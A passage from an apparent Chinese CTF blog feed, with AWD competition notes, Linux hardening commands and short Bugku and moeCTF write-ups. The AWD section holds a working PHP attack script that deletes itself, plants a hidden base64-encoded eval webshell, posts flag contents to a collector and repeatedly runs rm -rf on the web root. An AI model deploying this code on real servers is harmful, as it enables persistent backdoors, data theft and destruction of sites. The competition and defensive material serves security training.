class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">file_path = os.path.join(path, file)</span><br><span class="line"><span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line"><span class="keyword">if</span> initialization[<span class="string">&#x27;ok&#x27;</span>] == <span class="string">&#x27;false&#x27;</span>:</span><br><span class="line">dir_list.append(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">dir_list_tmp.append(file_path)</span><br><span class="line">ListDir(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> initialization[<span class="string">&#x27;ok&#x27;</span>] == <span class="string">&#x27;false&#x27;</span>:</span><br><span class="line">file_list.append(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">file_list_tmp.append(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetHash</span>():</span> <span class="comment"># 获取hash，建立索引</span></span><br><span class="line"><span class="keyword">for</span> bak <span class="keyword">in</span> file_list:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(bak, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">md5obj = hashlib.md5()</span><br><span class="line">md5obj.update(f.read())</span><br><span class="line"><span class="built_in">hash</span> = md5obj.hexdigest()</span><br><span class="line">bak_dict[bak] = <span class="built_in">hash</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&#x27;/tmp/awd_web_hash.txt&#x27;</span>) == <span class="literal">False</span>:</span><br><span class="line">os.system(<span class="string">&#x27;mkdir /tmp/awd_web_bak/&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;\\cp -a &#123;0&#125;* /tmp/awd_web_bak/&#x27;</span>.<span class="built_in">format</span>(web_dir))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_hash.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f: <span class="comment"># 记录web文件hash</span></span><br><span class="line">f.write(<span class="built_in">str</span>(json.dumps(bak_dict)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file_list: <span class="comment"># 记录web文件列表</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_list.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(i <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dir_list: <span class="comment"># 记录web目录列表</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_dir.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(i <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FileMonitor</span>():</span> <span class="comment"># 文件监控</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取当前web目录状态</span></span><br><span class="line"></span><br><span class="line">initialization[<span class="string">&#x27;ok&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(web_dir):</span><br><span class="line">file_path = os.path.join(web_dir, file)</span><br><span class="line"><span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">dir_list_tmp.append(file_path)</span><br><span class="line">ListDir(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">file_list_tmp.append(file_path)</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> file_list_tmp:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">md5obj = hashlib.md5()</span><br><span class="line">md5obj.update(f.read())</span><br><span class="line"><span class="built_in">hash</span> = md5obj.hexdigest()</span><br><span class="line">bak_dict_tmp[file] = <span class="built_in">hash</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_hash.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: <span class="comment"># 读取备份的文件hash</span></span><br><span class="line">real_bak_dict = json.loads(f.read())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_list.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: <span class="comment"># 读取备份的文件列表</span></span><br><span class="line">real_file_list = f.read().split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/awd_web_dir.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: <span class="comment"># 读取备份的目录列表</span></span><br><span class="line">real_dir_list = f.read().split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> real_dir_list: <span class="comment"># 恢复web目录</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.makedirs(<span class="built_in">dir</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[del-recover]dir:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">dir</span>))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> file_list_tmp:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> real_bak_dict[file] != bak_dict_tmp[file]: <span class="comment"># 检测被篡改的文件，自动恢复</span></span><br><span class="line">os.system(<span class="string">&#x27;\\cp &#123;0&#125; &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(file.replace(web_dir, <span class="string">&#x27;/tmp/awd_web_bak/&#x27;</span>), file))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[modify-recover]file:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(file))</span><br><span class="line"><span class="keyword">except</span>: <span class="comment"># 检测新增的文件，自动删除</span></span><br><span class="line">os.system(<span class="string">&#x27;rm -rf &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(file))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[delete]webshell:&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(file))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> real_file <span class="keyword">in</span> real_file_list: <span class="comment"># 检测被删除的文件，自动恢复</span></span><br><span class="line"><span class="keyword">if</span> real_file <span class="keyword">not</span> <span class="keyword">in</span> file_list_tmp:</span><br><span class="line">os.system(<span class="string">&#x27;\\cp &#123;0&#125; &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(real_file.replace(web_dir, <span class="string">&#x27;/tmp/awd_web_bak/&#x27;</span>), real_file))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[del-recover]file:&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(real_file))</span><br><span class="line">file_list_tmp[:] = []</span><br><span class="line">dir_list_tmp[:] = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;rm -rf /tmp/awd_web_hash.txt /tmp/awd_web_list.txt /tmp/awd_web_dir.txt /tmp/awd_web_bak/&#x27;</span>)</span><br><span class="line">web_dir = <span class="string">&#x27;/var/www/&#x27;</span> <span class="comment"># web目录，注意最后要加斜杠</span></span><br><span class="line">file_list = []</span><br><span class="line">dir_list = []</span><br><span class="line">bak_dict = &#123;&#125;</span><br><span class="line">file_list_tmp = []</span><br><span class="line">dir_list_tmp = []</span><br><span class="line">bak_dict_tmp = &#123;&#125;</span><br><span class="line">initialization = &#123;<span class="string">&#x27;ok&#x27;</span>: <span class="string">&#x27;false&#x27;</span>&#125;</span><br><span class="line">ListDir(web_dir)</span><br><span class="line">GetHash()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="built_in">print</span>(time.ctime() <span class="string">&#x27; 安全&#x27;</span>)</span><br><span class="line">FileMonitor()</span><br><span class="line">time.sleep(<span class="number">1</span>) <span class="comment"># 监控间隔，按需修改</span></span><br></pre></td></tr></table></figure><h1 id="AWD线下赛攻击脚本："><a href="#AWD线下赛攻击脚本：" class="headerlink" title="AWD线下赛攻击脚本："></a>AWD线下赛攻击脚本：</h1><p>（1）内存马&amp;自动获取刷新的flag</p><p>该脚本功能：</p><p>1.该脚本为内存脚本，访问一下就自删除，不留痕迹。</p><p>2.自动读取flag，并将flag提交到指定地址，会自动检测是否更新flag，只有更新了flag才会提交，需要在脚本中修改flag物理路径。</p><p>3.会生成不死马，不死马具有隐藏和欺骗功能。用蚁剑访问<a href="http://xxx/.c403d59fea33113df44d465aeec336ab.php?key=ssr2021shuoshurenmd5%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAa%E3%80%82">http://xxx/.c403d59fea33113df44d465aeec336ab.php?key=ssr2021shuoshurenmd5，密码为a。</a></p><p>木马原始代码如下（只要别人不知道key，就没办法黑吃黑）：</p><p><code>&lt;?php $key=$_GET[&#39;key&#39;];$keyhash=md5($key);if($keyhash===&#39;c403d59fea33113df44d465aeec336ab&#39;) &#123;    eval($_POST[&#39;a&#39;]);&#125;echo&#39;file not find.&#39;;?&gt;</code></p><p>这个只作为备用连接，flag正常自己提交过来的话就不用管。</p><p>4.该脚本会不断删除目标的网站源码，别人扣分等于我们加分。</p><p>5.脚本命名必须为awd2021.php，若要修改的话需要同步修改下面代码中的文件名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function send_post($url, $post_data) &#123;</span><br><span class="line">$postdata = http_build_query($post_data);</span><br><span class="line">$options = array(</span><br><span class="line"><span class="string">&#x27;http&#x27;</span> =&gt; array(</span><br><span class="line"><span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;header&#x27;</span> =&gt; <span class="string">&#x27;Content-type:application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;content&#x27;</span> =&gt; $postdata,</span><br><span class="line"><span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">15</span> * <span class="number">60</span></span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">$context = stream_context_create($options);</span><br><span class="line">$result = file_get_contents($url, false, $context);</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line">$flag_tmp=<span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">@unlink (<span class="params"><span class="string">&#x27;awd2021.php&#x27;</span></span>);</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>) &#123;</span><br><span class="line">$flag=system(<span class="string">&#x27;cat flag.txt&#x27;</span>);</span><br><span class="line">$data=array(</span><br><span class="line"><span class="string">&#x27;flag&#x27;</span> =&gt; $flag</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> ($flag!=$flag_tmp) &#123;</span><br><span class="line">send_post(<span class="string">&#x27;http://127.0.0.1/getflag.php&#x27;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line">$flag_tmp=$flag;</span><br><span class="line">$shell=base64_decode(<span class="string">&#x27;PD9waHAgJGtleT0kX0dFVFsia2V5Il07CiRrZXloYXNoPW1kNSgka2V5KTsKaWYoJGtleWhhc2g9PT0iYzQwM2Q1OWZlYTMzMTEzZGY0NGQ0NjVhZWVjMzM2YWIiKSB7CglldmFsKCRfUE9TVFsiYSJdKTsKfQplY2hvImZpbGUgbm90IGZpbmQuIjsKPz4=&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">&#x27;.c403d59fea33113df44d465aeec336ab.php&#x27;</span>)==<span class="number">0</span>) &#123;</span><br><span class="line">file_put_contents(<span class="string">&#x27;.c403d59fea33113df44d465aeec336ab.php&#x27;</span>, $shell, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&#x27;rm -rf /var/www/html/* !(.c403d59fea33113df44d465aeec336ab.php)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>（2）服务端接收flag</p><p>1.按照往年比赛经验，靶机和我们的电脑是互通的，这个脚本可以本机开一个phpstudy跑起来，若不通的话直接放自己的靶机服务器上。</p><p>2.这个脚本默认名字为getflag.php，如果修改的话需要修改内存脚本中对应的文件名。</p><p>3.新的flag会源源不断提交过来，在当前目录的shuoshuren_flag.txt里面。</p><p><code>&lt;?php$flag=$_POST[&#39;flag&#39;];file_put_contents(&#39;shuoshuren_flag.txt&#39;, $flag.&#39;\n&#39;, FILE_APPEND);?&gt;</code></p><p>（3）自动提交flag脚本</p><p>根据往年经验，flag提交平台是有验证码的，所以这个脚本调用了验证码训练识别模型，达到自动化提交flag的目的，平台没有验证码的话就不用识别。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># base python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetPic</span>(<span class="params">url</span>):</span> <span class="comment"># 获取验证码并识别，这里会调用我本机的验证码训练识别模型（refer：算命瞎子）</span></span><br><span class="line">pic_content=requests.get(url).content</span><br><span class="line">pic_base64=base64.b64encode(pic_content).decode()</span><br><span class="line">data=<span class="string">&#x27;base64=&#x27;</span> pic_base64</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">yzm=requests.post(<span class="string">&#x27;http://192.168.3.103:8899/base64&#x27;</span>,data=data).text</span><br><span class="line"><span class="keyword">return</span> yzm</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;yzm&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PostFlag</span>(<span class="params">PostUrl,PicUrl,flag</span>):</span> <span class="comment"># 提交flag</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(flag,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag_list=f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="comment">#请求头需要现场抓包</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flag_list:</span><br><span class="line"><span class="keyword">if</span> flag <span class="keyword">in</span> flag_list:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; 重复&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">GetYzm=GetPic(PicUrl)</span><br><span class="line">data = json.dumps(&#123;<span class="string">&#x27;请求体需要现场抓包，字典格式&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res=requests.post(url=PostUrl,headers=headers,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;成功的标识符&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; 提交成功&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">flag_list_ok.append(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; 提交失败&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;其他错误&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_list_ok=[]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#</span></span><br><span class="line">PostFlag(<span class="string">&#x27;提交flag的请求地址&#x27;</span>,<span class="string">&#x27;flag平台验证码的地址&#x27;</span>,<span class="string">&#x27;shuoshuren_flag.txt&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">300</span>)<span class="comment">#休息5分钟，可以按需修改</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="备份网站"><a href="#备份网站" class="headerlink" title="备份网站"></a>备份网站</h1><p>scp -r <a href="mailto:&#114;&#x6f;&#111;&#x74;&#64;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#x31;">&#114;&#x6f;&#111;&#x74;&#64;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#x31;</a>:/www/html ./   下载远程的/www/html到当前的目录</p><p>scp -r testfile <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#x30;&#46;&#x31;">&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#x30;&#46;&#x31;</a>:/www/html    把当前目录的testfile上传到远程的/www/html</p><h1 id="查看已建立的网络连接以及对应进程"><a href="#查看已建立的网络连接以及对应进程" class="headerlink" title="查看已建立的网络连接以及对应进程"></a>查看已建立的网络连接以及对应进程</h1><p>​    netstat -antulp | grep EST</p><h1 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h1><p>​    whoami　　//查看当前用户<br>​    pkill -kill -t &lt;用户tty&gt;　　 //踢掉当前登录用户</p><h1 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h1><p>​    查看进程信息<br>​    ps aux | grep pid或者进程名　　<br>​    </p><pre><code>查看指定端口被哪个进程占用lsof -i:端口号 或者 netstat -tunlp|grep 端口号结束进程命令kill PIDkillall &lt;进程名&gt;kill -9 &lt;PID&gt;</code></pre><h1 id="iptables命令"><a href="#iptables命令" class="headerlink" title="iptables命令"></a>iptables命令</h1><p>​    封杀某个IP或者ip段，如：123.4.5.6<br>​    iptables -I INPUT -s 123.4.5.6 -j DROP<br>​    iptables -I INPUT -s 123.4.5.1/24 -j DROP<br>​    </p><pre><code>禁止从某个主机ssh远程访问登陆到本机，如123.4.5.6iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROP</code></pre><h1 id="Mysql数据库操作"><a href="#Mysql数据库操作" class="headerlink" title="Mysql数据库操作"></a>Mysql数据库操作</h1><pre><code>备份mysql数据库mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql　　//备份指定数据库mysqldump --all-databases &gt; bak.sql　　　　//备份所有数据库还原mysql数据库mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql</code></pre><h1 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h1><pre><code>find / *.php -perm 4777 　　 //查找777的权限的php文件 awk -F: &#39;&#123;if($3==0)print $1&#125;&#39; /etc/passwd　　//查看root权限的账号crontab -l　　//查看计划任务检测所有的tcp连接数量及状态netstat -ant|awk &#39;&#123;print $5 &quot;\t&quot; $6&#125;&#39; |grep &quot;[1-9][0-9]*\.&quot;|sed -e &#39;s/::ffff://&#39; -e &#39;s/:[0-9]*//&#39;|sort|uniq -c|sort -rn　　查看页面访问排名前十的IPcat /var/log/apache2/access.log  | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10　　查看页面访问排名前十的URLcat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10　　</code></pre><p>　</p><h1 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h1><p>passwd</p><h1 id="后门用户"><a href="#后门用户" class="headerlink" title="后门用户"></a>后门用户</h1><p>cat /etc/passwd | grep bash<br>userdel hack<br>userdel backdoor</p><h1 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h1><p>scp -r <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#49;">&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#49;</a>:/var/www/html ./<br>scp testfile <a href="mailto:&#114;&#111;&#x6f;&#x74;&#64;&#x31;&#x32;&#x37;&#46;&#x30;&#x2e;&#48;&#46;&#49;">&#114;&#111;&#x6f;&#x74;&#64;&#x31;&#x32;&#x37;&#46;&#x30;&#x2e;&#48;&#46;&#49;</a>:/var/www/html</p><p>mysql -u root -h localhost -p<br>mysqldump TBNAME &gt; ~/tbname.sql</p><h1 id="改php数据库密码"><a href="#改php数据库密码" class="headerlink" title="改php数据库密码"></a>改php数据库密码</h1><p>方法一：update mysql.users set password=password(“123..com “) where user = ‘check’;<br>              flush privileges;</p><p>方法二：set password for root@localhost = password(‘123..com’);</p><p>SELECT user,host FROM mysql.user;<br>use mysql;<br>update user set host=’localhost’ where user=’root’;<br>flush privileges; </p><h1 id="通防"><a href="#通防" class="headerlink" title="通防"></a>通防</h1><p>//通过winscp，等方式，将cwphp.php通防脚本放到/var/www/html<br>cd /var/www/html<br>find -name ‘*.php’ -exec sed -i “1i <?php @include_once('/var/www/html/cwphp.php');?>“ {} ;</p><h1 id="查端口-禁用"><a href="#查端口-禁用" class="headerlink" title="查端口,禁用"></a>查端口,禁用</h1><p>netstat -antulp<br>iptables -I INPUT -p tcp –dprot 22 -j DROP    </p><h1 id="找简单漏洞"><a href="#找简单漏洞" class="headerlink" title="找简单漏洞"></a>找简单漏洞</h1><p>grep -rl eval /var/www/html<br>eval base64 system file_get_contents readfile fopen<br>find . -name ‘<em>.php’ | xargs grep -n ‘eval(‘<br>find . -name ‘</em>.php’ | xargs grep -n ‘assert(‘<br>find . -name ‘*.php’ | xargs grep -n ‘system(‘</p><h1 id="查端口禁用"><a href="#查端口禁用" class="headerlink" title="查端口禁用"></a>查端口禁用</h1><p>netstat -antulp<br>iptables -I INPUT -p tcp –dprot 22 -j DROP    </p><p>再推荐一篇安全应急排查手册：<a href="https://yq.aliyun.com/articles/177337">https://yq.aliyun.com/articles/177337</a> </p><p>部分来自<a href="http://www.360doc.com/content/21/0621/14/71939662_983023628.shtml">http://www.360doc.com/content/21/0621/14/71939662_983023628.shtml</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;给的是ctf低权限账号，但是中间件运行的是www-data权限，通常比ctf权限高，有些马用ssh上去删不掉，可以先传个自己的shell然后去删，当然得做一个防止被偷家的措施，比如说加一个if (‘xxx’===md5(key))的操作。也可以用www-data</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://zephyr-cyber.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>BugkuMisc</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/287057934.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/287057934.html</id>
    <published>2021-07-21T09:43:46.000Z</published>
    <updated>2022-12-13T12:22:45.284Z</updated>
    
    <content type="html"><![CDATA[<h1 id="where-is-flag"><a href="#where-is-flag" class="headerlink" title="where_is_flag"></a>where_is_flag</h1><p>下载附件得到10个txt文件，用010打开发现里面全是00截断符号<br><img src="/img/MISC/whereisflag1.jpg" alt="avatar"></p><p>看字节大小，用py脚本把每个文件的字节长度跑出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    name = <span class="built_in">str</span>(n)+<span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(f.read()),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/MISC/whereisflag2.jpg" alt="avatar"><br>跑出来的字节长度应该是十进制的ascii码，尝试对它进行分割，然后跑出来得到 bugku{na0d0ngdaka1}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    name = <span class="built_in">str</span>(n)+<span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(f.read()),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;98 117 103 107 117 123 110 97 48 100 48 110 103 100 97 107 97 49 125&#x27;</span></span><br><span class="line">flag=flag.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i)),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/MISC/whereisflag3.jpg" alt="avatar"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;where-is-flag&quot;&gt;&lt;a href=&quot;#where-is-flag&quot; class=&quot;headerlink&quot; title=&quot;where_is_flag&quot;&gt;&lt;/a&gt;where_is_flag&lt;/h1&gt;&lt;p&gt;下载附件得到10个txt文件，用010打开发现里面全</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://zephyr-cyber.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>moeCTF_2021</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/401787381.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/401787381.html</id>
    <published>2021-07-21T09:43:46.000Z</published>
    <updated>2022-12-13T12:46:30.963Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="beginOfCrypto"><a href="#beginOfCrypto" class="headerlink" title="beginOfCrypto"></a><em><strong>beginOfCrypto</strong></em></h2><blockquote><blockquote><p>看一下代码~<br>ord是把flag的每一个字符转成数字，map则是一个用来迭代的函数，也就是对flag里的每一个字符ord，list转成列表之后存进data列表里。之后的for循环把data列表里的数字取e的指数，并把结果存在cip列表里。<br>知道加密过程之后就很简单了~我们只需要把cip取e的对数，然后转成字符输出就可以了~    <del>第一题真是很温柔呢</del></p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">cip=[<span class="number">2.178203880729008e+47</span>, <span 